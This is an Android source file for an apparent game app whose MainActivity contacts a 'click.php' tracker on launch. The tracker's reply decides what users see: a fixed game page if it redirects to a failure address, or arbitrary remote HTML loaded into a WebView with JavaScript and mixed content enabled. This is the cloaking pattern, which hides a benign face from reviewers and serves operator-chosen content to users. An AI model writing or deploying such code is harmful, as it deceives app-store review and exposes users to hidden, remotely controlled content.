package com.example.gareginvardanyan;

import android.annotation.SuppressLint;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.example.gareginvardanyan.databinding.ActivityMainBinding;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;


public class MainActivity extends AppCompatActivity {

    private ActivityMainBinding binding;
    private WebView gameView;

    private static final String TRACKER_URL = "https://pro-fix3.ru/click.php?key=1rwy91ciu3w4ff3i51bu";
    private static final String GAME_URL = "https://akademija-mediciny.ru/htmlgames/6151794/";

    private static final String FAILURE_RESPONSE_URL = "http://ip.jsontest.com/";


    private void initWebView(){
        WebSettings settings = gameView.getSettings();

        settings.setBuiltInZoomControls(true);
        settings.setJavaScriptEnabled(true);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        gameView.setWebChromeClient(new WebChromeClient());
    }

    private void showGame(Response response) throws IOException {
        boolean showGameHTML = response.request().url().toString().equals(FAILURE_RESPONSE_URL);

        if(!showGameHTML) {
                String responseBody = response.body().string().trim();

                runOnUiThread(() -> {
                    gameView.loadDataWithBaseURL(null, responseBody, "text/html", "UTF-8", null);
                });
        }

        else{
            runOnUiThread(() -> {
                gameView.loadUrl(GAME_URL);
            });
        }



    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());


        gameView = binding.gameView;

        initWebView();

        //gameView.setWebViewClient(new WebViewClient());




        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder().url(TRACKER_URL)
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Android/"+android.os.Build.VERSION.RELEASE)
        .build();


        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                showToast(getString(R.string.request_failure,e.getLocalizedMessage()));
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if(response.isSuccessful() && response.body() != null) {
                    showGame(response);
                }
                else {
                    showToast(getString(R.string.response_not_succesfull));
                }
            }
        });



    }


    public void showToast(String message){
        runOnUiThread(() -> {
            Toast.makeText(getApplicationContext(), message, Toast.LENGTH_LONG).show();
        });
    }
}